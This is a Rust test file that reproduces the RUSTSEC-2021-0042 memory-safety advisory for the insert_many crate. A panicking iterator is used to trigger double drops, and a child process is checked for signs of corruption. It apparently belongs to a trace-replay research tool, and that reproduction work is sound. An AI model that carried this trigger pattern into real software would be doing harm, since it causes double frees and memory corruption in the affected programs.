//! Regression reproducer for RUSTSEC-2021-0042 / GHSA-29hg-r7c7-54fr.
//!
//! The case invokes the real `insert_many` 0.1.1 public API. The
//! advisory trigger is a user-provided `ExactSizeIterator` whose
//! `next()` panics after the crate has shifted the Vec's elements with
//! unsafe pointer copying.

use insert_many::InsertMany;
use rustdpr_trace::{dpr_function, dpr_hit, install_panic_hook};
use std::process::{Command, Output};

pub const SITE_INSERT_MANY_BOUNDARY: &str = "S00001";
pub const FN_INSERT_MANY_VULN: &str = "crate::run_public_api_poc";

#[derive(Debug)]
pub struct DropDetector {
    id: u32,
    _payload: Box<u64>,
}

impl DropDetector {
    pub fn new(id: u32) -> Self {
        Self {
            id,
            _payload: Box::new(0xD09D_F00D_u64 ^ id as u64),
        }
    }
}

impl Drop for DropDetector {
    fn drop(&mut self) {
        // Keep this textual pattern: replay tests treat duplicate prints
        // as optional evidence on platforms that unwind far enough.
        println!("Dropping insert_many {}", self.id);
    }
}

#[derive(Debug, Default)]
pub struct PanickingIterator;

impl Iterator for PanickingIterator {
    type Item = DropDetector;

    fn next(&mut self) -> Option<Self::Item> {
        panic!("RUSTDPR_INSERT_MANY_ITERATOR_PANIC");
    }
}

impl ExactSizeIterator for PanickingIterator {
    fn len(&self) -> usize {
        // Inserting at index 0 with len() > 0 makes insert_many shift
        // existing elements into still-untracked slots before next()
        // panics. The original Vec length remains old, so duplicated
        // ownership can remain inside the drop range.
        2
    }
}

/// Real public-API PoC for RUSTSEC-2021-0042.
pub fn run_public_api_poc() {
    install_panic_hook();
    let _guard = dpr_function!(FN_INSERT_MANY_VULN);

    let mut values = vec![
        DropDetector::new(1),
        DropDetector::new(2),
        DropDetector::new(3),
    ];

    dpr_hit!(SITE_INSERT_MANY_BOUNDARY);
    values.insert_many(0, PanickingIterator);
}

fn spawn_child_poc() -> Output {
    let current_exe = std::env::current_exe().expect("current test binary path");
    Command::new(current_exe)
        .env("RUSTDPR_INSERT_MANY_RUN_CHILD", "1")
        .arg("--ignored")
        .arg("__insert_many_child_process")
        .arg("--nocapture")
        .output()
        .expect("spawn insert_many PoC child process")
}

fn child_output_has_replay_evidence(output: &Output) -> bool {
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}\n{stderr}");

    let duplicate_drop_1 = combined.matches("Dropping insert_many 1").count() >= 2;
    let duplicate_drop_2 = combined.matches("Dropping insert_many 2").count() >= 2;
    let duplicate_drop_3 = combined.matches("Dropping insert_many 3").count() >= 2;

    !output.status.success()
        || duplicate_drop_1
        || duplicate_drop_2
        || duplicate_drop_3
        || combined.contains("RUSTDPR_INSERT_MANY_ITERATOR_PANIC")
        || combined.contains("double free")
        || combined.contains("unsafe precondition")
        || combined.contains("corrupted")
        || combined.contains("STATUS_STACK_BUFFER_OVERRUN")
}

#[cfg(test)]
mod tests {
    use super::*;
    use rustdpr_trace::init_trace;

    #[test]
    #[ignore = "child process that intentionally triggers the historical insert_many bug"]
    fn __insert_many_child_process() {
        if std::env::var("RUSTDPR_INSERT_MANY_RUN_CHILD").ok().as_deref() != Some("1") {
            eprintln!("child PoC test skipped because RUSTDPR_INSERT_MANY_RUN_CHILD is not set");
            return;
        }
        run_public_api_poc();
    }

    #[test]
    #[ignore = "spawns a child process that intentionally triggers the historical insert_many bug"]
    fn reproduces_public_advisory() {
        let output = spawn_child_poc();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        assert!(
            !stdout.contains("running 0 tests"),
            "child PoC test was not selected by the test filter.\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}\nSTATUS:{:?}",
            output.status
        );

        assert!(
            child_output_has_replay_evidence(&output),
            "vulnerable insert_many PoC did not expose replay evidence.\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}\nSTATUS:{:?}",
            output.status
        );
    }

    #[test]
    #[should_panic(expected = "RUSTDPR_INSERT_MANY_REPLAY_CONFIRMED_AFTER_API_BOUNDARY")]
    fn rustdpr_deterministic_trace_replay() {
        init_trace("artifacts/trace.jsonl").expect("initialize RustDPR trace");
        install_panic_hook();
        let _guard = dpr_function!(FN_INSERT_MANY_VULN);

        // API-boundary marker. The true unsafe operation lives inside
        // the external insert_many 0.1.1 dependency.
        dpr_hit!(SITE_INSERT_MANY_BOUNDARY);

        let output = spawn_child_poc();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        assert!(
            !stdout.contains("running 0 tests"),
            "child PoC test was not selected by the test filter.\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}\nSTATUS:{:?}",
            output.status
        );

        if child_output_has_replay_evidence(&output) {
            panic!("RUSTDPR_INSERT_MANY_REPLAY_CONFIRMED_AFTER_API_BOUNDARY");
        }

        panic!("RUSTDPR_INSERT_MANY_REPLAY_UNEXPECTEDLY_SUCCEEDED_AFTER_API_BOUNDARY");
    }
}
